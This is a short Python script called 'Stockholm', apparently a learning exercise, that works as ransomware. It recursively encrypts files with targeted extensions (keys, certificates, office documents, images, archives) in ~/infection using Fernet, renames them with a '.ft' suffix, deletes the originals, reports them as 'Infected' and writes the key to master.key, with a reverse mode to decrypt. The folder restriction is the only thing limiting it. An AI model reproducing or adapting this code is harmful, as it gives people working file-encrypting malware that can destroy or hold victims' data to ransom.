#!/usr/bin/env python3
from cryptography.fernet import Fernet
from pathlib import Path
import argparse
import os

def args_manager():
    parser = argparse.ArgumentParser(description="Spider")
    parser.add_argument(
        "-v", "--version", 
        action="version", 
        version="Stockholm version 1.0",
        help="Give you the version of the program"
    )
    parser.add_argument(
        "-r", "--reverse",
        type=str,
        help="Indicate the key to reverse the process and decrypt the files"
    )
    parser.add_argument(
        "-s", "--silent",
        action="store_true",   
        help="Turn to program in silent mode"
    )
    args = parser.parse_args()
    return(args)

class RansomWare():
    def __init__(self, key, silent):
        self.key = key
        self.silent = silent
        self.target_extensions = {
            '.der', '.pfx', '.key', '.crt', '.csr', '.p12', '.pem', '.odt', 
            '.ott', '.sxw', '.stw', '.uot', '.3ds', '.max', '.3dm', '.txt', 
            '.doc', '.docx', '.xls', '.xlsx', '.ppt', '.pptx', '.jpg', '.jpeg', 
            '.png', '.csv', '.sql', '.pdf', '.zip', '.rar', '.7z'
        }

    def decrypt_files(self, path):
        # -- Init the key -- #
        fernet_key = Fernet(self.key.encode())
        # -- Recurcively checked the files on the folder -- #
        if os.path.exists(path):
            main_folder = Path(path)
            for element in main_folder.rglob('*'):
                if element.is_file() and element.suffix == '.ft':
                    try:
                        with open(element, 'rb') as f: 
                            content = f.read()
                        # -- Decrypt the data of the file and restore it -- #
                        decrypted_data = fernet_key.decrypt(content)
                        new_file = element.with_suffix('')
                        with open (new_file, 'wb') as f:
                            f.write(decrypted_data)
                        os.remove(element)
                        if(self.silent is False):
                            print(f"Restored {element} -> {new_file}")
                    except Exception as e:
                        print(f"[ERROR], {e}")
        

    def encrypt_files(self, path):
        # -- Initialisation of the key -- #
        init_key = Fernet.generate_key()
        fernet_key = Fernet(init_key)
        # -- Recurcively checked the files on the folder -- #
        if os.path.exists(path):
            main_folder = Path(path)
            for element in main_folder.rglob('*'):
                if element.is_file() and element.suffix != '.ft' and element.suffix in self.target_extensions:
                    try:
                        with open(element, 'rb') as f: 
                            content = f.read()
                        # -- Encrpyt the data of the file -- #
                        encrypted_data = fernet_key.encrypt(content)
                        new_file = element.with_suffix(element.suffix + '.ft')
                        with open (new_file, 'wb') as f:
                            f.write(encrypted_data)
                        os.remove(element)
                        if(self.silent is False):
                            print(f"Infected {element} -> {new_file}")
                    except Exception as e:
                        print(f"[ERROR], {e}")
        # -- Saving the key -- #
        try:
            key_file = open("master.key", 'wb')
            key_file.write(init_key)
            if(self.silent is None):
                print("Key saved!")
        except Exception as e:
            print(f"[ERROR], {e}")

def main():
    args = args_manager()
    Stockholm = RansomWare(args.reverse, args.silent)
    infection_path = Path('~/infection').expanduser()
    if(args.reverse is None):
        Stockholm.encrypt_files(infection_path)
    else:
        Stockholm.decrypt_files(infection_path)
    return()


if(__name__ == "__main__"):
    main()